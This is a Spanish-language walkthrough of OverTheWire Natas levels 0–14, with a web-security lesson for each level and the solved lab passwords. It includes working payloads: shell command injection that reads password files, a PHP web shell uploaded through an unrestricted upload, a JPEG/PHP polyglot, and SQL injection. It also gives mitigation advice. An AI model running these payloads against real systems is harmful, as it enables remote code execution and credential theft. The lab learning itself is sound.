____________
# Índice de Natas

### GitHub
- [Level 0](#level-0)
- [Level 1](#level-1)
- [Level 2](#level-2)
- [Level 3](#level-3)
- [Level 4](#level-4)
- [Level 5](#level-5)
- [Level 6](#level-6)
- [Level 7](#level-7)
- [Level 8](#level-8)
- [Level 9](#level-9)
- [Level 10](#level-10)
- [Level 11](#level-11)
- [Level 12](#level-12)
- [Level 13](#level-13)
- [Level 14](#level-14)
- [Level 15](#level-15)
- [Level 16](#level-16)
- [Level 17](#level-17)
- [Level 18](#level-18)
- [Level 19](#level-19)
- [Level 20](#level-20)


### GitHub
- [Level 0](#level-0)
- [Level 1](#level-1)
- [Level 2](#level-2)
- [Level 3](#level-3)
- [Level 4](#level-4)
- [Level 5](#level-5)
- [Level 6](#level-6)
- [Level 7](#level-7)
- [Level 8](#level-8)
- [Level 9](#level-9)
- [Level 10](#level-10)
- [Level 11](#level-11)
- [Level 12](#level-12)
- [Level 13](#level-13)
- [Level 14](#level-14)
- [Level 15](#level-15)
- [Level 16](#level-16)
- [Level 17](#level-17)
- [Level 18](#level-18)
- [Level 19](#level-19)
- [Level 20](#level-20)



__________________________________


Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at **http://natasX.natas.labs.overthewire.org**, where X is the level number. There is **no SSH login**. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. **All passwords are also stored in /etc/natas_webpass/**. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Start here:

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

___________

# Level 0

- En este ejercicio simplemente tenemos que inspeccionar la pagina con en el **Element Inspector** y buscar por *password* y ahí estará 

![[Captura de pantalla 2025-12-06 165642.png]]



```
0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq 
```

## Aplicación en la vida real

- Este ejercicio nos presenta una sanitización extremadamente muy pobre en el sentido que simplemente viendo ***Element Inspector*** y buscando por password la misma pagina esta diseñada para darnos la contraseña 

# Level 1

- En este ejercicios aplicamos lo mismo que la anterior, y la razon por que este es distinto es por que esta bloqueado el click derecho que nos permitiria ver en inspeccionar

![[Captura de pantalla 2025-12-06 171136.png]]

```
TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```

____________

# Level 2

- Este nivel presenta la una dificultad mayor ya que nos lleva a revisar mas alla *HTML* y en este vemos algo curioso y es una imagen, esto nos interesa por que claramente en la pagina no hay imagenes lo que lo hace algo sospechoso

![[Captura de pantalla 2025-12-06 231035.png]]

```
files/pixel.png
```

- Lo siguiente es inspeccionar el codigo fuente y ver que es esta imagen. Si cxargamos la pagina con el  *files/pixel.png* vemos que no aparece nada peroooo si vemos solo con */files* vemos que  nos aparece lo siguiente

![[Captura de pantalla 2025-12-06 231646.png]]


- Si le damos en *users.txt* veremos que hay usuarios con contrasenas y hay una en especifico que nos da la contrasena de el siguiente y si la probamos en el siguiente nivel vemos que funciona!

![[Captura de pantalla 2025-12-06 231843.png]]

```
3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```

________________


# Level 3

- Este nivel nos ofrece el mismo enunciado 

```
There is nothing on this page
```

   - Para este ejercicio tenemos que entender algo muy importante, **Robots Exclusion Protocol** ya que tenemos que apuntar a un archivo que esta ahi

### **Robots Exclusion Protocol**:

El **Robots Exclusion Protocol** (`robots.txt`) es un archivo público que muchos sitios usan para indicar a los crawlers qué rutas no deben indexar, pero que, en la práctica, puede revelar directorios sensibles (como `/admin/`, `/backup/`, `/api/`) a un pentester. Para detectarlo, simplemente accede a `https://sitio.com/robots.txt`; si existe, analiza las rutas bloqueadas y prueba acceder a ellas manualmente o con herramientas como **Gobuster**, **Dirb** o **FFuF** para enumerar archivos ocultos (ej: `config.php.bak`, `backup.sql`). Aunque no es una barrera de seguridad, su contenido suele ser un buen punto de partida para encontrar información expuesta o vulnerabilidades. **Siempre verifica el acceso real** y combina esta técnica con otras de reconocimiento. En resumen: `robots.txt` es un mapa de pistas, no una protección, y su explotación depende de tu capacidad para investigar lo que oculta.

### **¿Qué son los "crawlers" y los "robots"?**

- **Crawlers (o spiders):** Son programas automatizados que recorren la web para indexar contenido. El más famoso es el **Googlebot** de Google, pero hay muchos otros (Bingbot, Yandex, etc.).
- **Robots:** Término genérico para cualquier programa automatizado que interactúa con sitios web (no solo crawlers, también herramientas de scraping, bots de redes sociales, etc.).

**Implicancia en la vida real:**

- **Para seguridad:** Un `robots.txt` mal configurado puede **revelar rutas sensibles** (como paneles de administración, APIs internas, etc.) a atacantes.

### Important to remenber

It’s not obsolete, but its role is limited to guiding crawlers, not protecting content. For security, always use proper authentication and access controls.

as a pentester, you should assume that most websites you test will have a `robots.txt` file.

![[Captura de pantalla 2025-12-07 175333.png]]

- Luego de eso vamos a */s3cr3t/*

![[Captura de pantalla 2025-12-07 175603.png]]

- Le damos en **users.txt**

![[Captura de pantalla 2025-12-07 175712.png]]
- Y ahi tenemos la contrasena

```
QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

_________________

# Level 4

![[Captura de pantalla 2025-12-13 043123.png]]

- This exercise requires us to understand the concept of the **Referer** header.
    
- What is the Referer?
    

In HTTP, the **Referer** is an optional request header that identifies the address of the web page from which the request was made. By checking this header, the server can determine where the request originated.

- What security implications does it have?
    

For example, consider a **password reset** page that includes a social media link in its footer. If the user clicks that link, the external site may receive the reset URL through the Referer header. If sensitive information is included in the URL, this could potentially compromise the user’s security.

- Based on this, we need to capture the request and manipulate the **Referer** header, because this level requires the request to come from **natas5** in order to obtain the password, as stated in the challenge.
    

![[Captura de pantalla 2025-12-13 043332.png]]

- Simply changing `natas4` to `natas5` in the URL will not work.
    
- The practical goal of this exercise is to understand that **Burp Suite** allows us to intercept the HTTP request and modify the **Referer** header to `natas5`, as required by the application, and in this way retrieve the password.
    
- Password natas5:
    

`0n35PkggAPm2zbEpOU802c0x0Msn1ToK`

### Real-world application

The `Referer` header is part of the HTTP request and can be easily modified using tools such as **Burp Suite**, **OWASP ZAP**, or browser extensions like **ModHeader**. This level demonstrates an insecure validation based on a client-controlled header.

Trusting the Referer header for authentication or authorization is dangerous because it is not reliable and can be altered or removed by the client. While it may still be used for analytics or basic request validation, it should never be relied on as a security control. Legacy systems or misconfigured applications that depend on this header for access control are especially vulnerable.

____________

# Level 5

 - En este ejercicio tenemos que entender un concepto muy importante, el ***loggedin=***. Este parametro nos indica si estamos logeados o no en la pagina, el 0 significa ***nologgedin*** y el 1 que si esta logeado.
-  En mi caso yo opte por ir a console y probar con tipicos de XSS y me sirvio javascript:alert(document.cookie) pero me quede frustrado por que solo me imprimia ***loggedin=0*** hasta que vi que en storage era posible cambiar ese 0 a 1, lo que me hizo el login completo y me mostro la contrasena 

![[Captura de pantalla 2025-12-14 021058.png]]

```
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

## Contexto en la vida real

- En un entorno real, un parámetro como `loggedin` **solo es manipulable cuando el servidor confía directamente en su valor para decidir el estado de autenticación**, es decir, cuando no existe una validación real en el backend. Esto ocurre en aplicaciones mal diseñadas donde el estado de login se basa en parámetros o cookies visibles (`loggedin=1`, `isAdmin=true`, etc.), permitiendo que un atacante los modifique y obtenga acceso no autorizado. En cambio, **no es manipulable** cuando la autenticación se gestiona correctamente en el servidor mediante sesiones o tokens firmados, donde el cliente únicamente envía un identificador opaco y cualquier cambio manual del parámetro es ignorado o invalidado. Un pentester identifica si es manipulable probando variaciones del valor y observando si cambian los permisos o el acceso, ya que cualquier decisión de seguridad que dependa de datos controlados por el cliente indica una falta de control de acceso adecuado.

________________
# Level 6

- En este ejercicio tenemos que revisar el codigo fuente con **ctrl+u**

![[Captura de pantalla 2025-12-14 053320.png]]

- Si ponemos este fragmento en la URL principal aparece esto 

![[Captura de pantalla 2025-12-14 054102.png]]

```
FOEIUWGHFEEUHOFUOIU
```

- Y si ponemos ese codigo en el buscador nos da la contrasena

![[Captura de pantalla 2025-12-14 052835.png]]

```
FOEIUWGHFEEUHOFUOIU
```

```
bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

## Vida real

- Este ejercicio nos ensena a revisar toda la información disponible y que pueda ser de ayuda, en estos casos tenemos esta ruta que nos proveyó información sensible. Muchos programadores dejan estas rutas sensibles o información sensible por medio de notas en estos lugares, por eso es importante revisar todo y darse cuenta de esas cosas que no cuadran

_______________________________

# Level 7

- En este ejercicio a la primera vemos en el código que nos dice este enunciado que es muy útil 

```
 hint: password for webuser natas8 is in /etc/natas_webpass/natas8 
```

- Pero tenemos que saber ahora donde poner este enunciado lo que nos va a llevar a revisar mas la pagina.
- Revisando a fondo me di cuenta de algo relevante y es un ***href*** y teniendo en cuenta como funciona y que en la pagina principal hay dos lugares para redireccionar podemos probar si este ***href***  nos funciona

![[Captura de pantalla 2025-12-14 064249.png]]

- Vamos a probar si ese ***href*** esta sanitizado poniendo la ruta de la contraseña que descubrimos en el path de la ruta ***home*** 

![[Captura de pantalla 2025-12-14 063517.png]]

- Y funciono!!! nos redirigió a la contraseña

```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```
### En la vida real:

- Este ejercicio nos ensena a aprovecharnos de la mala sanitización que puede tener un ***href***, entender esto nos puede evitar muchos problemas.

     Un `href` es vulnerable cuando su valor proviene del usuario y permite ejecutar código (por ejemplo con `javascript:` o rompiendo el atributo). Si el navegador interpreta el input como código, el `href` no está bien sanitizado.

     **Un `href` está bien sanitizado cuando el navegador no ejecuta código con él.** Esto pasa si el link viene **del código y no del usuario**, o si viene del usuario pero la aplicación **solo permite URLs seguras** y bloquea cosas como `javascript:` o caracteres que rompan el atributo.


_________________
# Level 8

- En este ejercicio nos lleva a ver el codigo fuente 

![[Captura de pantalla 2025-12-14 235920.png]]

- Es importante entender este script

- Guarda un valor **hexadecimal fijo** (`$encodedSecret`).

`encodeSecret()` hace:
    - Base64 al texto
    - Invierte la cadena
    - Convierte a hex
- El usuario envía un texto por `POST`.
- El texto enviado se codifica con `encodeSecret()`.
- Se compara el resultado con `$encodedSecret`.
- Si coinciden → **access granted**  
    Si no → **wrong secret**

- Entendiendo esto tenemos que tomar el hex que nos dan

```
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```


![[Captura de pantalla 2025-12-15 000632.png]]

![[Captura de pantalla 2025-12-15 000326.png]]

- Si ingresamos ese valor en la pagina principal nos dará la contraseña 

![[Captura de pantalla 2025-12-14 231742 1.png]]

```
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

## Aplicación en la vida real 

- Este ejercicio nos ensena primero a ver información sensible que los programadores dejan por ahí y segundo aprender a trabajar con hexadecimales y base64 y como codificar y descodificar estos valores

_____________________
# level 9

- En este ejercicio nos tenemos que fijar en como funciona el script que esta en el código base, es el siguiente:

![[Captura de pantalla 2025-12-16 033406.png]]

- Este script nos ensena una cosa y es que lo que se ponga en el buscador se va a buscar en ese diccionario, pero hay algo mas importante y es ese ***passthru***. Tenemos que saber como funciona y por que es una falla critica de seguridad
### passthru:

En **PHP**, la función `passthru()` se utiliza para **ejecutar un comando del sistema** y **enviar su salida directamente al navegador o a la salida estándar**, sin procesarla ni almacenarla en una variable.

Es importante entender que respecto a la seguridad nunca debemos pasar datos de usuario directamente a `passthru()` sin validarlos o escaparlos, ya que puede provocar **inyección de comandos**.

- Conociendo esto podemos intentar mandarle codigo y ver si funciona. nos damos cuenta que un comando como ***cd etc/passwd*** funciona entonces vamos a intentar algo mas complicado. vamos a usar el punto y como (;) que en la terminal sirve para separar comandos y vamos a listar la contraseña con el siguiente código: 

```
; cat  /etc/natas_webpass/natas10
```

     Y funciona! 

![[Captura de pantalla 2025-12-16 040001.png]]

```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

## Aplicación en la vida real 

- Este ejercicio nos ensena dos cosas muy básicas, la primera es el análisis profundo de scripts entendiendo su funcionamiento para aprovecharse de el por ejemplo identificando fallas criticas de seguridad como el uso de ***passthru***, segundo el conocimiento y aplicación de comandos básicos de la shell como lo es el punto y coma ";" que con la simple funcion de separar comandos pero con creatividad como es el caso se puede explotar 

_________________________
# Level 10

- En este caso se filtran caracteres lo que nos dificulta la ejecución de código 

![[Captura de pantalla 2025-12-16 042734.png]]

- Para resolver este ejercicio tenemos que optar por caracteres como ***.**** los cuales no están escapados y de por simbolizan cosas importantes, en especial significa "en la posición actual mándame el numero determinado de archivos que estén ahí o que en cierto caso cumplan con la especificaciones requeridas"  

- Usando .* vemos que nos lista la siguiente información

![[Pasted image 20251217025149.png]]

- Entonces aprovechemos para listar la contraseña con lo siguiente:

```
.* /etc/natas_webpass/natas11
```

![[Captura de pantalla 2025-12-17 025435.png]]

- Y funciona!

```
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

_________________
# Level 11

- Este ejercicio nos exige entender muy bien como funciona el cifrado XOR y como se interpreta  sus variables (key, plaintext, ciphertext) con la informacion que nos ofrece la pagina 

     Vamos a entender que es *XOR*:

El cifrado XOR es un tipo de encriptación que **se basa en el uso de puertas lógicas XOR para codificar y verificar la autenticidad de los datos**. Es una operación al igual que la suma o la multiplicación, pero que funciona con bits, es decir, un sistema binario de unos (1) y ceros (0). Esta operación se utiliza en casi todos los **algoritmos criptográficos**.
### Componentes Importantes:

- **Plaintext**: The original message (e.g., `"hello"`).
- **Key**: A secret value used to encrypt/decrypt (e.g., `"key"`).
- **Ciphertext**: The encrypted result (e.g., the output of `plaintext XOR key`).

The key must be the same length as the plaintext, or repeated if shorter.
If the key is shorter, it’s repeated (e.g., for "hello" and key "ab", the key becomes "ababa").
### ¿Cómo trabajan entre si?

Como el cifrado XOR es reversible se puede interpretar el hecho de que si nos falta uno de los 3 componentes pero si tenemos lo dos restantes podemos obtener el tercero y asi sucesivamente

Ejemplo

`Plaintext + Key → (XOR) → Ciphertext`

**Ejemplo:**

- Plaintext: `"Hola"`
- Key: `"123"`
- Ciphertext: `ÞÆØß` (resultado de aplicar XOR a cada letra).

Parte de entender este ejercicio es saber identificar cada componente, y en este caso identificar el *cipher* es clave, ya que si vemos el código fuente vemos que este se guarda en la **cookie** y esto es algo relevante por que saber donde los programadores ponen la información es critico!

- **Si guardara el plaintext en la cookie**cualquiera podría editarlo (¡inseguro!).
- **Si guardara la key en la cookie**, ¡todos podrían descifrar todo! (¡desastre!).
- **Por eso solo se guarda el ciphertext en la cookie**: solo el servidor (que tiene la key) puede descifrarlo.

- Análisis 

![[Pasted image 20251223224136.png]]

- Primero, teniendo en cuenta los conceptos principales de XOR deducimos que ***$defaultdata*** es el ***plaintext***, tambien entendemos que este se guarda en la cookie como ***ciphertext*** con este mensaje de ***showpassword=>no*** entonces por logica tenemos que cambiar ese **no** a **si** y para eso entonces tendríamos que tener el valor ***cipher*** para tener el ***key*** y así modificar la cookie 

     Entonces tenemos
     - plaintext-> {"showpassword":"no","bgcolor":"#ffffff"}
     - ciphertext ->  .f$..3'..7 .. uUG*8MIf5..+;..fmMF"1.."1M
     - key -> eDWo

- Analizando el código nos damos cuenta que el ***plaintext*** se le aplica un **json_decode** entoces tenemos de que hacer un decode para sacar el valor que necesitamos 

![[Captura de pantalla 2025-12-23 233411.png]]

***Lo podemos hacer en esta pagina:***[[ https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler]]

 - Ahora tenemos que sacar el **cipher** de la cookie y teniendo en cuenta que esta tiene ***base64*** hay decodificarlo
![[Captura de pantalla 2025-12-24 065709.png]]
##### Esta parte la vamos a hacer en el siguiente link:
[CyberChef](https://gchq.github.io/CyberChef/)

- Vamos paso por paso, primero como vemos que nuestra cookie esta en ***base64*** colocamos *From Base64* (paso 1) y lo pasamos con nuestra cookie (paso 2) y ese resultado seria el *cipher*, luego teniendo el *cipher* y el *plaintext* es momento de sacar la *key*, para eso en el paso 3 seleccionamos **XOR** y en la parte de *key* colocamos el *plaintext* lo que nos lleva al punto 4 dandonos la key.

- Ya teniedo la *key* podemos modificar el *plaintext* y colocarse el *yes* para que se actualice con la cookie. 

![[Captura de pantalla 2025-12-24 071328.png]]

- Usando toda la información que ya tenemos obtenemos nuestra cookie modificada que sustituyéndola con la cookie original y refrescando la pagina nos da la contraseña 

![[Captura de pantalla 2025-12-24 064952.png]]

```
yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

## Aplicación en la vida real 

En la vida real, el **ciphertext** es lo único que el público "debería" ver, pero el error fatal de los programadores es dejar el **plaintext** (el código original) o la **key** (la clave) "por ahí" tirados, ya sea escritos directamente en el código fuente de la página o en archivos de configuración accesibles. Como pentester, tu misión es recolectar estas piezas descuidadas, porque en cuanto tienes el ciphertext y encuentras ese plaintext que el programador dejó a la vista, la clave queda expuesta automáticamente por la naturaleza del XOR, permitiéndote manipular los datos y tomar el control total del sistema.

El XOR es el "motor" más usado en la criptografía moderna debido a su increíble velocidad y eficiencia a nivel de bits, siendo la pieza fundamental de algoritmos ultra seguros como **AES** y **ChaCha20**, que protegen casi todo el internet hoy en día. Sin    embargo, en su forma pura y simple (como lo viste en Natas), solo se encuentra en sistemas antiguos, protocolos de comunicación muy básicos o, muy frecuentemente, en **malware**, donde los creadores de virus lo usan como una forma rápida y "barata" de esconder sus intenciones de los antivirus sin complicar el código. Como pentester, si encuentras un XOR simple, estás ante una implementación perezosa o un sistema que prioriza la velocidad sobre la seguridad real.

Este ataque realizamos se llama **Known-Plaintext Attack (KPA)** o en español **Ataque de texto claro conocido** 

**Ataque de texto plano conocido (KPA):** Es una estrategia de criptoanálisis donde el atacante tiene acceso tanto al mensaje original (**plaintext**) como a su versión cifrada (**ciphertext**). Al comparar ambos, el atacante puede revelar la clave secreta (**key**) o el algoritmo utilizado para descifrar otros mensajes en el futuro.

 - ¿Dónde lo verás en tu carrera de Pentester?

1. **Malware:** Los virus suelen cifrar sus textos (como las direcciones IP a las que se conectan) con un XOR simple para no ser detectados por firmas básicas.
2. **Ofuscación de datos:** Muchas aplicaciones guardan configuraciones locales pasadas por un XOR rápido para que un usuario común no las lea al abrir el archivo con un bloc de notas.
3. **Criptografía de alto nivel:** Dentro de algoritmos complejos (como el que usa WhatsApp o tu banco), el XOR es el paso final que mezcla la clave con tus datos.
### ¿Por qué es importante saber trabajar con UTF-8?

Esta es la parte más técnica y fascinante. Los computadores no entienden letras, solo números (bytes).

- **El problema de los formatos:** Si pones la llave en formato **Hexadecimal**, el programa espera números como `61 62 63`. Si la pones en **Decimal**, espera `97 98 99`.
- **¿Qué es UTF-8?:** Es el "traductor" universal que le dice a CyberChef: _"Toma cada letra que escribo (como la 'e', la 'D', la 'W') y conviértela en su valor numérico estándar de 8 bits"_.

Si no seleccionas UTF-8 (o si lo dejas en Hex por error), CyberChef intentará hacer el XOR usando el valor de los caracteres "estratosféricos" o simplemente no entenderá la clave, y el resultado será una cadena de símbolos chinos o caracteres extraños que no sirven para el servidor PHP de Natas.

________________
# Level 12

- Este ejercicio nos plantea el ejercicio donde el subir archivos puede presentar un gran riesgo ye veremos por que.

![[Captura de pantalla 2025-12-27 124241.png]]

- Vemos que tenemos que subir un archivo y este se subirá como *.jpg* lo que sera muy importante de entender pero también hay que ver el código fuente 

![[Captura de pantalla 2025-12-27 124639.png]]


- Identificamos que el servidor utiliza PHP, lo que nos permite ejecutar código si logramos subir un archivo con esa extensión. Al analizar el código fuente, observamos una vulnerabilidad de **Unrestricted File Upload**: el servidor toma el nombre del archivo directamente del parámetro `$_POST["filename"]` y lo concatena en `$target_path` **sin validar la extensión en el lado del servidor**. Esto nos permite interceptar la petición y cambiar la extensión original (.jpg) por una ejecutable (.php)

- Es importante recalcar que se esta usando *php* y esto nos sirve mucho ya que con esto sabemos en que lenguaje mandar un script malicioso pero tambien tenemos que fijarnos en como el código procesa el nombre de el archivo que subimos ya que en este caso no hay sanitización, se ve que con ese $_POST["filename"] se toma el nombre de el archivo y se pone en el $target_path sin sanitizacion . Para ser específicos tenemos que mandar un script que nos de una **cmd** para sacar la contraseña con el siguiente contenido:

```
<?php passthru($_GET['cmd']); ?>
```

- Antes de hacer nuestro script malicioso vamos a entender el por que de usar **passthru()** y por que no otros como **shell_exec()** o **exec()**.  Aunque estos dos ultimos tambien nos dan un output este no es el apropiado y veamos el por que:

**exec()**  
Si lanzas un comando que tiene muchas líneas de texto, exec() solo te muestra la última línea. Las otras 9 se las queda él (a menos que le des una mochila especial llamada "arreglo" para guardarlas).

**shell_exec()**
Te devuelve todo el resultado de golpe, pero como si fuera un solo bloque de texto largo. No puedes ver qué pasó mientras él estaba en la tienda; solo ves el resultado final cuando termina.

**passthru()**
No guarda nada en la memoria de PHP, simplemente "abre un agujero" y deja que la salida del comando fluya directo a tu pantalla. Por eso es perfecto para ver archivos de texto o listas de carpetas sin que nada se pierda o se formatee mal.

Elegí passthru sobre otras funciones como shell_exec porque permite un flujo de datos limpio y sin procesar (raw), evitando que PHP añada ruido o trunque la salida, lo cual es vital para obtener la contraseña de forma íntegra.


- En este momento tenemos que parar y volver al código, como mencionamos anteriormente cada archivo que subamos se va a subir en formato *jpg* lo que nos fuerza a usar ***burpsuite*** para modificar la solicitud (en especial el formato de el archivo)

![[Captura de pantalla 2025-12-27 125708.png]]

- Modificamos este *jpg* a *php* y mandamos la petición, con la petición mandada le damos click Izq y le damos en *show response in browser* copiamos el link y lo abrimos. Estando ahí nos tiene que mostrar un link y si le damos click nos muestra algo como esto 

![[Captura de pantalla 2025-12-27 130317.png]]

     Con esto ya sabemos y confirmamos que se subio como php, ya solo nos queda     hacer la peticion para ver la contrasena 

![[Captura de pantalla 2025-12-27 130509.png]]

- Y tenemos la contraseña!!

```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

- El nombre de esta vulnerabilidad es: **Unrestricted File Upload** (Subida de archivos sin restricciones) que deriva en una **Remote Code Execution (RCE)**.

Aunque el formulario parece "obligar" a que el archivo sea una imagen, la vulnerabilidad existe porque el servidor confía ciegamente en la información que envía el usuario (en este caso, a través de Burp Suite). Al lograr que el servidor guarde y ejecute un archivo `.php`, el atacante toma el control del servidor con los permisos del usuario que corre la web (www-data). 


## Aplicación en la vida real:

- Este ejercicio nos ensena a rectificar como se procesa la información, como se santifica el subir información  
  Para prevenir esto, los desarrolladores no deben confiar en los nombres de archivo proporcionados por el usuario. Se deben usar listas blancas de extensiones permitidas, verificar el **MIME-type** real del archivo y, de ser posible, renombrar los archivos subidos a nombres aleatorios sin ejecución de scripts

_________________

# Level 13

- En este ejercicio se toma el mismo código base, sin embargo hay un pequeño cambio y este:

![[Captura de pantalla 2025-12-27 162028.png]]

 - Y que hace este **exif_imagetype**? 
     **exif_imagetype:**
     es una función de PHP que valida la **integridad** de un archivo leyendo sus **Magic Bytes** (los primeros bytes del encabezado). Su función es determinar el formato real del archivo basándose en su **firma binaria** y no en su extensión de nombre, devolviendo una constante (ej. `IMAGETYPE_JPEG`) si es una imagen válida o `false` si no lo es.

- Esto nos revela que tenemos que manipular los **Magic Bytes** para pasar otra vez nuestro script malicioso de **php**

     Para listar los **Magic Bytes** en Linux usamos el siguiente codigo

```
xxd -l 8 nombre_del_archivo
```

- Y los primero 8 digitos son lo que identifica cada archivo

```
00000000: ffd8 ffe0 0010 4a46  /ffd8 ffe0 son los primeros bytes (magic numbers) típicos de un archivo JPEG.
```

-  Inicialmente yo pensé que creando un archivo ***php*** y modificando sus **magic numbers** funcionaria para pasar un script malicioso y de cierta forma funciono pasando  el filtro de el **exif_imagetype** pero en la realidad debido a que la pagina web esta esperando una imagen me dio un error ya que a pesar de la modificacion de los  **magic numbers** el archivo no es una imagen realmente entonces no iba a funcionar y la pagina no lo iba a pasar. 

     La solución consta de mandar una imagen normal y capturar la solicitud y ahi en *burpsuite* modificar el archivo, pasarlo a *php* e introducir el script malicioso


![[Captura de pantalla 2025-12-31 165145.png]]

- Esto hay que explicarlo por partes

**primero:** En amarillo vemos partes de la solicitud que se tienen que modificar para que queden como php y se puedan ejecutar

**segundo:** En verde vemos el *header de la imagen* que es importante dejar para que la pagina web siga procesando esto como imagen  y no se de cuenta que es un *php* ya que como explique anteriormente fue la causa de mi error en mi primer intento.

**Tercero:** En este vemos el script malicioso que nos dará la contraseña

```
<?php passthru('cat /etc/natas_webpass/natas14'); ?>
```

- A continuación veremos como estaba inicialmente la solicitud para notar la diferencia 

![[Captura de pantalla 2025-12-31 170541.png]]

- Si ejecutamos nuestro script ya nos da la contraseña

![[Captura de pantalla 2025-12-31 172003.png]]

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

## Aplicación en la vida real 

- Este ejercicio nos ensena como la utilización de un solo filtro de seguridad como es **exif_imagetype** no es suficiente para evitar filtraciones además de un concepto muy importante llamado **archivos poliglotas**

### ¿Qué es un Archivo Políglota? (Resumen para tus notas)

Es un archivo **"Camaleón"** que posee múltiples identidades binarias. Técnicamente, es un bloque de datos que cumple simultáneamente con las especificaciones de dos o más formatos. No es que el archivo "cambie", es que **contiene las firmas necesarias para que diferentes programas lo acepten como suyo.**

### Implicaciones en Ciberseguridad

- **Quiebre de la Confianza:** Invalida la idea de que "si el archivo abre como foto, es seguro".
- **Bypass de Firewalls (WAF):** Los firewalls que solo inspeccionan el tráfico buscando firmas conocidas (Magic Bytes) son engañados fácilmente.
- **Ataques Cross-Protocol:** Un archivo puede ser una imagen para un servidor web, pero un comando de base de datos para otro sistema, permitiendo saltar de un servicio a otro dentro de una red.

| **Nivel de Dificultad**   | **Formatos Comunes**         | **¿Por qué es posible? (Técnica)**                                                                                             | **Implicación en Ciberseguridad (Riesgo)**                                                                                                         |     |
| ------------------------- | ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| **Fácil (Tolerantes)**    | **JPEG, GIF, PHP, HTML**     | **Ignorancia selectiva:** Los intérpretes buscan sus etiquetas (`<?php` o `<html>`) y el resto lo ignoran como "ruido".        | **RCE (Remote Code Execution):** Permite esconder scripts en fotos (Natas 13). El servidor cree que es multimedia, pero el motor PHP lo ejecuta.   |     |
| **Medio (Estructurados)** | **ZIP, PDF, JAR**            | **Anclaje de datos:** Permiten añadir datos al final (Appending) o en comentarios sin romper la estructura lógica del archivo. | **Evasión de Antivirus:** Un PDF puede contener un ZIP oculto con malware. El escáner lo ve como un documento, pero el atacante lo extrae después. |     |
| **Difícil (Rígidos)**     | **EXE, ELF (Linux), Mach-O** | **Orden estricto:** Requieren tablas de símbolos y offsets exactos. Un solo byte fuera de lugar y el archivo no se ejecuta.    | **Infección de Binarios:** Se usa para "Inyectar" código en programas legítimos. Es la base de los virus que infectan otros archivos ejecutables.  |     |
**¿Cómo se previene esto? (Defensa en Profundidad)** Para neutralizar archivos políglotas, las aplicaciones modernas no deben confiar en el archivo original. La mejor defensa es la **Sanitización Dinámica**:

1. **Re-procesamiento:** Pasar toda imagen subida por una librería (como GD o ImageMagick) para "re-dibujarla". Esto destruye cualquier código extra (PHP) y deja solo píxeles.
2. **Almacenamiento Aislado:** Guardar los archivos en servidores de contenido estático (S3, Google Cloud Storage) que no tienen instalado un intérprete de PHP.
3. **Renombrado Forzado:** El servidor debe ignorar el nombre del usuario y asignar un nombre aleatorio con una extensión fija (ej. `hash123.jpg`).

- Links 
[Comprensión de las vulnerabilidades de carga de archivos con la comprobación MIME - Overthewire.org - Natas 13](https://www.youtube.com/watch?v=z5e4zcw2sq8)

_____________

# level 14

- Este ejercicio nos plantea una Inyeccion ***sqli**, revisando el codigo fuente me di cuenta de algo muy interesante


![[Captura de pantalla 2026-01-02 050410 2.png]]

- Este nos plantea algo muy importante y es donde esta la falla! Nos dice que hay que dar mas de 2 líneas para que nos den la contraseña y para hacer esto usamos el **union select** famoso en inyecciones **sql**

![[Captura de pantalla 2026-01-02 045606.png]]

- Y esto nos da la contraseña 

![[Captura de pantalla 2026-01-02 045511.png]]

```
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```


## Aplicación en la vida real 

- Este ejercicio evidencia la falta de sanitizacion en el pagina web en el procesamiento de datos debido a que la entrada de datos no deberia usa **uso de puntos (.) o signos**, Si ves que la consulta se arma pegando trozos (`"SELECT..." . $var`), es casi 100% vulnerable. Entendamos el por que.... 


La vulnerabilidad ocurre cuando una aplicación confía ciegamente en la entrada del usuario para construir una consulta a la base de datos. En Natas 14, el error reside en este código:

`$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";`

### ¿Por qué es vulnerable?

- **Concatenación de Strings:** El uso del punto (`.`) para "pegar" el texto del usuario a la instrucción SQL mezcla la **orden** con el **dato**.
- **Falta de Contexto:** La base de datos no sabe qué parte escribió el programador y qué parte escribió el atacante.

## Extras importantes 


Para detectar si un sistema es vulnerable a SQLi, busca siempre estas tres señales:

1. **Manipulación de Strings (Concatenación):** Si el código arma la consulta uniendo trozos de texto con variables (`"..." . $var` o `"..." + var`). Es el indicador de peligro #1.
2. **Ausencia de Sentencias Preparadas:** Si no ves funciones como `prepare()` y `bind_param()`. Esto significa que la aplicación no separa la lógica de los datos.
3. **Errores Reflejados (Verbose Errors):** Si al ingresar un carácter especial (como una comilla `"` o `'`) la página devuelve un error técnico de la base de datos. Esto confirma que tu entrada está "rompiendo" la consulta directamente en el motor SQL.

### Mitigación (Defensa Técnica)

La única defensa profesional es la **Parametrización (Sentencias Preparadas)**, que separa físicamente la "orden" del "dato". Al enviar la estructura de la consulta primero y el valor del usuario después, el motor SQL trata cualquier entrada (aunque tenga comillas o comandos `UNION`) como simple texto muerto sin capacidad de ejecución. A esto se le suma el **Principio de Menor Privilegio** (que el usuario de la DB no sea 'root') y la **desactivación de errores detallados**, para que un atacante no reciba pistas sobre la estructura interna de las tablas si su ataque falla.

_______________

# Level 15

